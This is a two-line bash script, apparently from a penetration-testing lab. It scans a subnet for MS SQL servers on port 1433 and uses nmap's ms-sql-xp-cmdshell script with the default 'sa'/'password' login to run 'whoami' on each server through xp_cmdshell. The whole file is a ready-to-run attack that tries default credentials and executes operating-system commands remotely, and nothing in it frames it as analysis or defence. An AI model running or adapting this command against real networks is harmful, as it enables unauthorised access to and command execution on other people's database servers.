#!/bin/bash
nmap -p 1433 --open --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,ms-sql-xp-cmdshell.cmd="whoami" 10.11.1.0/24
